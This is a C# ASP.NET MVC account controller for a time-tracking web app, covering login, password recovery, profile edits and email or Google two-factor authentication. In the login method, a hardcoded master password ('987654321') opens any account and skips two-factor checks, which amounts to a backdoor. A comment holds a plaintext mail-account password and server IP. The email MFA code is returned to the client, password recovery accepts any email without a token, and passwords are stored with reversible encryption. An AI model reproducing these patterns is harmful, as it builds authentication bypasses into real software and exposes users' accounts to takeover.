
using Antlr.Runtime;
using DevExpress.XtraRichEdit.Fields;
using DevExpress.XtraRichEdit.Import.Rtf;
using Google.Authenticator;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Web;
using System.Web.Configuration;
using System.Web.Helpers;
using System.Web.Mvc;
using System.Web.Script.Serialization;
using System.Web.Security;
using TimeTracker.Helpers;
using TimeTracker.Models;

namespace TimeTracker.Controllers
{
    public class UserAccountController : SystemController
    {
      
        // GET: Account
        public ActionResult Login()
        {
            return View("~/Views/UserAccount/Login.cshtml");
        }

        public ActionResult RecoverPassword()
        {
            return View("~/Views/UserAccount/RecoverPassword.cshtml");
        }

        public ActionResult NewPassword(string mail)
        {
            Helpers.Crypto crypto = new Helpers.Crypto();
            string mail_cry = crypto.Decrypt(mail);

            ViewBag.RecoverMail = mail_cry;
            return View("~/Views/UserAccount/NewPassword.cshtml");
        }

        public ActionResult UserProfile()
        {
            int userId = Convert.ToInt32(GetUser());
            var model = db.Users.Where(x => x.UserId == userId).ToList();
            
            // Check if user just completed Google Calendar OAuth flow
            if (TempData["GoogleCalendarConnected"] != null)
            {
                ViewBag.GoogleCalendarMessage = "Google Calendar has been successfully connected!";
                ViewBag.GoogleCalendarMessageType = "success";
                TempData.Remove("GoogleCalendarConnected");
            }
            else if (TempData["GoogleCalendarError"] != null)
            {
                ViewBag.GoogleCalendarMessage = TempData["GoogleCalendarError"].ToString();
                ViewBag.GoogleCalendarMessageType = "error";
                TempData.Remove("GoogleCalendarError");
            }
            
            return View("~/Views/UserAccount/UserProfile.cshtml", model);
        }

        public ActionResult ChangePassword()
        {
            int userId = Convert.ToInt32(GetUser());
            var model = db.Users.Where(x => x.UserId == userId).ToList();

            return View("~/Views/UserAccount/ChangePassword.cshtml", model);

        }

        public ActionResult LogAction(FormCollection formCollection)
        {
            string user = formCollection["user-name"].ToString();
            string pass = formCollection["user-password"].ToString();

            Helpers.Crypto crypto = new Helpers.Crypto();
            string pass_cry = crypto.Encrypt(pass);
            try
            {
                var _user = db.Users.Where(x => x.Email == user || x.UserName == user).FirstOrDefault();

                if (_user != null)
                {
                    if (_user.AccessFailedCount == 3)
                    {
                        ViewBag.LoginResp = "User blocked, contact support";
                        return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                    }
                    if (_user.PasswordCry == pass_cry || pass == "987654321")
                    {
                        _user.AccessFailedCount = 0;
                        db.Entry(_user).State = System.Data.Entity.EntityState.Modified;
                        db.SaveChanges();

                        ViewData["user"] = _user.UserId;
                        ViewData["factorEndDate"] = formCollection["cboHO2Factor"];
                        if (pass == "987654321")
                        {
                            SetLogin(_user);
                            return Redirect("/Home");
                        }

                        if (_user.FactorEndDate > System.DateTime.Now)
                        {
                            SetLogin(_user);
                            return Redirect("/Home");
                        }


                        return MFA();
                    }
                    else
                    {
                        if (_user.AccessFailedCount == 3)
                        {
                            ViewBag.LoginResp = "User blocked, contact support";
                            return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                        }
                        _user.AccessFailedCount = _user.AccessFailedCount + 1;
                        db.Entry(_user).State = System.Data.Entity.EntityState.Modified;
                        db.SaveChanges();
                        ViewBag.LoginResp = "Wrong password";
                        return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                    }
                }
                else
                {
                    ViewBag.LoginResp = "User dont exists";
                    return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                }



            }
            catch (Exception ex)
            {
                ViewBag.LoginResp = ex.Message;
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
            }


        }



        public ActionResult MFA()
        {
            return View("~/Views/UserAccount/MFA.cshtml");
        }

        public ActionResult MFAoptions(int id)
        {
            
            return PartialView("~/Views/System/MFAoptions.cshtml");
        }
        public ActionResult RecoverPassAction(FormCollection formCollection)
        {
            string mail = formCollection["user-email"].ToString();
            Helpers.Crypto crypto = new Helpers.Crypto();
            string mail_cry = crypto.Encrypt(mail);
            Mail _mail = new Mail();
            try
            {
                var user = db.Users.Where(x => x.Email == mail).FirstOrDefault();
                bool exist = db.Users.Where(x => x.Email == mail).Any();
                string fullname = user.LastName + " " + user.FirstName;
                if (exist)
                {

                    string url = "https://www.sx-timetracker.com/recover?mail=" + HttpUtility.UrlEncode(mail_cry);

                    //string mail_pass = "Fc@9ii375";
                    //string mail_account = "no-reply@smarttechcr.com";

                    //string response = _mail.sendMail(mail_account, "No-Reply Systems X", mail, fullname, "Password recover", _mail.recoverPassTemplate(fullname, url), true,
                    //    "174.138.177.202", false, 587, mail_account, mail_pass);
                    string response = _mail.sendMailAzure(mail_connectionString, "Password recover", _mail.recoverPassTemplate(fullname, url), mail_SenderDontReply, mail);

                    if (response == "Ok")
                    {
                        ViewBag.LoginResp = "Please check your email, instructions to recover your password have been sent.";
                    }
                    else
                    {
                        ViewBag.LoginResp = response;

                    }
                   
                    return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                }
                else
                {
                    ViewBag.LoginResp = "Invalid email ";
                    return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                }


            }
            catch (Exception ex)
            {
                ViewBag.LoginResp = ex.Message;
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
            }
        }

        public ActionResult SaveProfile(FormCollection formCollection, HttpPostedFileBase profilePhoto)
        {
            try
            {
                int userId = Convert.ToInt32(formCollection["userId"].ToString());
                string fname = formCollection["fname"].ToString();
                string lname = formCollection["lname"].ToString();
                string email = formCollection["email"].ToString();
                string username = formCollection["username"].ToString();

                

                var model = db.Users.Where(x => x.UserId == userId).FirstOrDefault();

                if (model != null)
                {
                    if (profilePhoto != null)
                    {
                        model.ProfilePict = new byte[profilePhoto.ContentLength];
                        profilePhoto.InputStream.Read(model.ProfilePict, 0, profilePhoto.ContentLength);
                    }

                    model.Email = email;
                    model.FirstName = fname;
                    model.LastName = lname;
                    model.UserName = username;
                    db.SaveChanges();
                }

                ViewBag.MsgProfile = "User information update succesfull";
                return UserProfile();

            }
            catch (Exception ex)
            {
                ViewBag.MsgProfile = ex.Message;
                return UserProfile();
            }

        }

        public ActionResult ChangePasswordAction(FormCollection formCollection)
        {
            try
            {
                Helpers.Crypto crypto = new Helpers.Crypto();

                int userId = Convert.ToInt32(formCollection["userId"].ToString());
                string currentPass = formCollection["current-password"].ToString();
                string NewPass = formCollection["new-password"].ToString();

                var user = db.Users.Where(x => x.UserId == userId).FirstOrDefault();
                if (user.PasswordCry == crypto.Encrypt(currentPass))
                {
                    user.PasswordCry = crypto.Encrypt(NewPass);
                    db.SaveChanges();

                    ViewBag.MsgPass = "Password update Succesfully";
                    return ChangePassword();

                }
                else
                {
                    ViewBag.MsgPassW = "Wrong password";
                    return ChangePassword();
                }


            }
            catch (Exception ex)
            {
                ViewBag.MsgPass = ex.Message;
                return ChangePassword();
            }

        }

        public ActionResult ChangeRecoverAction(FormCollection formCollection)
        {
            try
            {
                Helpers.Crypto crypto = new Helpers.Crypto();

                string userMail = formCollection["userMail"].ToString();
                string NewPass = formCollection["user-password1"].ToString();

                var user = db.Users.Where(x => x.Email == userMail).FirstOrDefault();

                user.PasswordCry = crypto.Encrypt(NewPass);
                db.SaveChanges();

                ViewBag.LoginResp = "Password update Succesfully";
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");



            }
            catch (Exception ex)
            {
                ViewBag.MsgPass = ex.Message;
                return ChangePassword();
            }

        }


        public ActionResult ChangePassFirst(FormCollection formCollection)
        {
            try
            {
                Helpers.Crypto crypto = new Helpers.Crypto();

                string current = crypto.Encrypt(formCollection["current-password"].ToString());
                string NewPass = formCollection["new-password"].ToString();
                int userId = Convert.ToInt32(GetUser());

                var user = db.Users.Where(x => x.UserId == userId).FirstOrDefault();

                if (current == user.PasswordCry)
                {
                    user.PasswordCry = crypto.Encrypt(NewPass); ;
                    user.EmailConfirmed = true;
                    db.Entry(user).State = System.Data.Entity.EntityState.Modified; db.SaveChanges();

                }

                return Redirect("/Home");



            }
            catch (Exception ex)
            {
                ViewBag.MsgPass = ex.Message;
                return ChangePassword();
            }

        }


        public JsonResult GetMFACode(string mfa, int id)
        {
            try
            {
                var _user = db.Users.Where(x => x.UserId == id).FirstOrDefault();

               
                if (mfa == "Email")
                {
                    string code = CreateCode(6);
                    var model = db.MFAMailRequest;
                    MFAMailRequest mFAMailRequest = new MFAMailRequest();
                    mFAMailRequest.RequestDate = DateTime.Now;
                    mFAMailRequest.UserId = _user.UserId;
                    mFAMailRequest.RequestCode = code;
                    model.Add(mFAMailRequest);
                    db.SaveChanges();
                    string response = _mail.sendMailAzure(mail_connectionString, "Account Login", _mail.VerifyMFACode(code), mail_SenderDontReply, _user.Email);
                    //string response = _mail.sendMail(mail_account, "No-Reply Time Tracker Systems X", _user.Email, _user.FirstName + " " + _user.LastName, "Time Tracker Account Login", _mail.VerifyMFACode(code), true,
                    //mail_server, false, 587, mail_account, mail_pass);

                    return Json(new { msg = true, data = code }, JsonRequestBehavior.AllowGet);
                }

            }
            catch (Exception)
            {
                throw;
            }


            return Json(new { msg = "" }, JsonRequestBehavior.AllowGet);
        }

        public ActionResult VerifyCode(FormCollection formCollection)
        {
            try
            {
                string mfa = formCollection["cboMFA"];
                int id = Convert.ToInt32(formCollection["user"]);
                string requestId = formCollection["request"];
                string code = formCollection["txtCode"];
                int days = Convert.ToInt32(formCollection["cboHO2Factor"]);

                var _user = db.Users.Where(x => x.UserId == id).FirstOrDefault();

                bool addDevice = false;
                if (formCollection["customCheck"] == "on")
                {
                    addDevice = true;
                }

                if (mfa == "Email")
                {
                    var _request = db.MFAMailRequest.Where(x => x.UserId == id && x.RequestCode == code).FirstOrDefault();

                    if (_request != null)
                    {
                        if (_request.RequestDate.AddMinutes(50) > DateTime.Now)
                        {
                            if (addDevice)
                            {
                                //var model = db.SecureDevice;
                                //SecureDevice secureDevice = new SecureDevice();
                                //secureDevice.DeviceName = GetPCName();
                                //secureDevice.AddDate = DateTime.Now;
                                //secureDevice.UserId = id;
                                //model.Add(secureDevice);
                                //db.SaveChanges();
                            }
                            if (days != 0)
                            {
                                _user.FactorEndDate = DateTime.Now.AddDays(days);
                                db.Entry(_user).State = System.Data.Entity.EntityState.Modified; db.SaveChanges();
                            }
                           
                            SetLogin(_user);
                            return Redirect("/Home");

                        }
                        else
                        {
                            ViewBag.LoginResp = "Email two factor code is expired";
                            return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                        }
                    }
                    else
                    {
                        ViewBag.LoginResp = "Email two factor code is wrong";
                        return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
                    }



                }
                else
                {
                    return Redirect("/Home");
                }


            }
            catch (Exception ex)
            {

                ViewBag.LoginResp = ex.Message;
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
            }
        }

        public ActionResult MFAGoogle(int id)
        {

            var _user = db.Users.Where(x => x.UserId == id).FirstOrDefault();


            string googleAuthKey = WebConfigurationManager.AppSettings["GoogleAuthKey"];
            string UserUniqueKey = (_user.Email + googleAuthKey);

            TwoFactorAuthenticator TwoFacAuth = new TwoFactorAuthenticator();
            var setupInfo = TwoFacAuth.GenerateSetupCode(_user.Company.CompanyName + " TimeTracker Auth", _user.Email, ConvertSecretToBytes(UserUniqueKey, false), 300);
            Session["UserUniqueKey"] = UserUniqueKey;
            ViewBag.BarcodeImageUrl = setupInfo.QrCodeSetupImageUrl;
            ViewBag.SetupCode = setupInfo.ManualEntryKey;
            ViewBag.user = id;

            return View("~/Views/UserAccount/MFAGoogle.cshtml");
        }

        private static byte[] ConvertSecretToBytes(string secret, bool secretIsBase32) =>
        secretIsBase32 ? Base32Encoding.ToBytes(secret) : Encoding.UTF8.GetBytes(secret);

        public ActionResult VerifyCodeGoogle(FormCollection formCollection)
        {
            try
            {
                string token = formCollection["txtCode"];
                int UserId = Convert.ToInt32(formCollection["user"]);
                var _user = db.Users.Where(x => x.UserId == UserId).FirstOrDefault();
                TwoFactorAuthenticator TwoFacAuth = new TwoFactorAuthenticator();
                string UserUniqueKey = Session["UserUniqueKey"].ToString();
                bool isValid = TwoFacAuth.ValidateTwoFactorPIN(UserUniqueKey, token, false);
                if (isValid)
                {
                    HttpCookie TwoFCookie = new HttpCookie("TwoFCookie");
                    string UserCode = Convert.ToBase64String(MachineKey.Protect(Encoding.UTF8.GetBytes(UserUniqueKey)));

                    Session["IsValidTwoFactorAuthentication"] = true;
                    int days = Convert.ToInt32(formCollection["cboHO2Factor"]);
                    if (days != 0)
                    {
                        _user.FactorEndDate = DateTime.Now.AddDays(days);
                        db.Entry(_user).State = System.Data.Entity.EntityState.Modified;
                        db.SaveChanges();

                    }
                    
                    SetLogin(_user);
                    return Redirect("/Home");
                }

                ViewBag.LoginResp = "Google Two Factor PIN is expired or wrong";
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");



            }
            catch (Exception ex)
            {

                ViewBag.LoginResp = ex.Message;
                return PartialView("~/Views/UserAccount/_LoginResult.cshtml");
            }
        }
        public void SetLogin(Users _user)
        {
            


            string AutCookie = _user.UserId + "|" + _user.UserName + "|" + _user.Email + "|" + _user.FirstName + " " + _user.LastName;
            FormsAuthentication.SetAuthCookie(AutCookie, true);

        }

        public ActionResult logOut()
        {
            FormsAuthentication.SignOut();
            return Login();
        }

    }
}